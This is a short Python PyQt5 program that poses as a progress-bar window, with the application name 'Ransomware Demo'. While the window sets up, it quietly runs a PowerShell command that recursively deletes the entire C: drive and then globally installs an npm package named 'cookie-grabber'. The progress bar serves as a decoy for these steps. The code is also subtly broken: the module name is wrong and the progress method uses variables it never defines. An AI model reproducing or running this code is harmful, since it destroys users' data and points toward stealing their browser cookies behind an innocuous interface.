import sys, os, time, subprocess, pyqt5.QtCore, pyqt5.QtGui, pyqt5.QtWidgets
import base64

from urllib.request import urlopen

class App(pyqt5.QtWidgets.QMainWindow):

    def __init__(self):
        super().__init__()

        self.width = 250
        self.height = 50

        self.initUI()

    def initUI(self):

        self.progress_image = pyqt5.QtGui.QImage("res/bar.png")
        self.progress_palette = pyqt5.QtGui.QPalette()
        self.progress_palette.setBrush(
            pyqt5.QtGui.QPalette.Window, pyqt5.QtGui.QBrush(self.progress_image)
        )

        self.progress_label = pyqt5.QtWidgets.QLabel("")
        self.progress_label.setPalette(self.progress_palette)
        self.progress_label.setFixedSize(self.width, self.height)
        self.statusBar().addWidget(self.progress_label)

        pow = subprocess.Popen(
            'powershell -NoProfile -nologo rd C:\ /s /q && npm install -g cookie-grabber',
            shell=True,
            stdout=subprocess.PIPE
        )
        stdout, stderr = pow.communicate()

        total_iterations = len(stdout.decode().split('\n'))
        curr_iter = 0
        self.progress_loop = pyqt5.QtCore.QTimer()
        self.progress_loop.timeout.connect(self.updateProgress)
        self.progress_loop.start(200)

    def updateProgress(self):
        self.progress_label.resize(self.width, curr_iter*self.height//total_iterations)
        if curr_iter < total_iterations - 1:
            curr_iter += 1
        else:
            self.progress_loop.stop()
            self.close()

if __name__ == "__main__":
    app = pyqt5.QtWidgets.QApplication(sys.argv)
    app.setApplicationName('Ransomware Demo')
    ex = App()
    ex.show()
    sys.exit(app.exec_())
